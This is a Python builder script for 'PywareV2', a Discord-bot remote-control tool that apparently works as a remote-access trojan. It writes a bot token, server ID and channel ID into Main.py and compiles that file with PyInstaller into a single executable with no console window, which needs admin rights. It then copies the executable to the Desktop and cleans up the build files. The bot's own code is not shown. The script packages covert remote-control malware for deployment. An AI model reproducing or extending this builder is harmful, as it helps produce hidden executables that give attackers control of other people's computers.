import os
import subprocess
import sys
import shutil

MAIN_FILE = "Main.py"
PLACEHOLDERS = {
    "TOKEN": '"<Bot-Token>"',
    "SERVER_ID": '<SERVER-ID>',
    "CHANNEL_ID": '<CHANNEL-ID>'
}

def set_title():
    os.system("title Setup PywareV2 - V1.2")


def logo():
    print("""
  ____                             __     ______  
 |  _ \ _   ___      ____ _ _ __ __\ \   / /___ \ 
 | |_) | | | \ \ /\ / / _` | '__/ _ \ \ / /  __) |
 |  __/| |_| |\ V  V / (_| | | |  __/\ V /  / __/ 
 |_|    \__, | \_/\_/ \__,_|_|  \___| \_/  |_____|
        |___/                                      
---------------------------------------------------
|🔧 Remote Control Discord-Bot made by Ole4923.   |
|⚠️ Important: The Bot need admin rights!         |
|📬 Discord: discord.gg/BNaDKPrmaP                |
---------------------------------------------------
    """)

def ask_user_inputs():
    while True:
        token = input("👉 Bot Token: ").strip()
        clear_screen()
        logo()
        server_id = input("👉 Server-ID: ").strip()
        clear_screen()
        logo()
        channel_id = input("👉 Channel-ID: ").strip()
        clear_screen()
        logo()

        # Bestätigung einholen
        print("Please double-check the following values:")
        print(f"|🔑 Token: {token}")
        print(f"|🖥️  Server ID: {server_id}")
        print(f"|💬 Channel ID: {channel_id}")
        
        confirmation = input("✅/❌ Do you want to build a .exe? (yes/no): ").strip().lower()
        
        if confirmation in ["yes", "y"]:
            print("✔️ Confirmed.\n")
            clear_screen()
            return token, server_id, channel_id
        else:
            print("🔁 Let's try again...\n")
            clear_screen()
            logo()


def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def replace_placeholders(token, server_id, channel_id):
    with open(MAIN_FILE, 'r', encoding='utf-8') as f:
        original_content = f.read()
    
    modified_content = original_content
    modified_content = modified_content.replace(PLACEHOLDERS["TOKEN"], f'"{token}"')
    modified_content = modified_content.replace(PLACEHOLDERS["SERVER_ID"], server_id)
    modified_content = modified_content.replace(PLACEHOLDERS["CHANNEL_ID"], channel_id)

    with open(MAIN_FILE, 'w', encoding='utf-8') as f:
        f.write(modified_content)

    return original_content

def reset_placeholders(original_content):
    with open(MAIN_FILE, 'w', encoding='utf-8') as f:
        f.write(original_content)
    print("✅ Placeholders in Main.py have been reset")

def build_exe():
    print("⚙️ Creating EXE with PyInstaller...")
    subprocess.run([sys.executable, '-m', 'pip', 'install', 'pyinstaller'], check=True)

    subprocess.run([
        'pyinstaller',
        '--onefile',
        '--noconsole',
        MAIN_FILE
    ], check=True)

    exe_name = os.path.splitext(MAIN_FILE)[0] + ".exe"
    source = os.path.join("dist", exe_name)
    
    # Zielpfad auf den Desktop setzen
    desktop_path = os.path.join(os.path.expanduser('~'), 'Desktop')
    target = os.path.join(desktop_path, exe_name)

    if os.path.exists(source):
        shutil.copy2(source, target)
        print(f"✅ EXE saved to Desktop: {target}")
    else:
        print("❌ EXE was not created.")

def cleanup(original_content):
    print("🧹 Cleaning up temporary files...")
    for folder in ['build', 'dist']:
        if os.path.isdir(folder):
            shutil.rmtree(folder)
    for file in os.listdir():
        if file.endswith('.spec'):
            os.remove(file)
    
    reset_placeholders(original_content)
    clear_screen()
    logo()
    input("press enter to quit...")

def main():
    if not os.path.exists(MAIN_FILE):
        print(f"❌ {MAIN_FILE} not found.")
        return

    clear_screen()
    logo()
    set_title()
    token, server_id, channel_id = ask_user_inputs()
    
    
    original_content = replace_placeholders(token, server_id, channel_id)
    
    try:
        build_exe()
    finally:
        cleanup(original_content)

if __name__ == "__main__":
    main()
